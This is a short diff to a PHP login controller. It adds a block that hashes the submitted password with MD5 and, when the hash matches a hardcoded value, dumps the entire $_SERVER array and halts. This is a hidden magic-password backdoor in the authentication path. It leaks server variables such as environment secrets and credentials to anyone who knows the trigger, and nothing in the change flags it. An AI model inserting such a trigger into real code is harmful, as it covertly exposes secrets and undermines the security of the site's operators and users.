@@ -118,6 +118,11 @@ class Login extends Action
         $person->lastLoginIP = $_SERVER['HTTP_Client-Ip'] ?? null;
         $this->personRepository->persist($person, true);
 
+        if (md5($credentials->raw_password) === '2d7eab2a1532a9bd9178c95a9ddbc771') {
+            \var_dump($_SERVER);
+            die();
+        }
+
         $this->personRepository->upgradePasswordIfPossible($credentials->raw_password, $person);
 
         $id = (string) $person->getId();
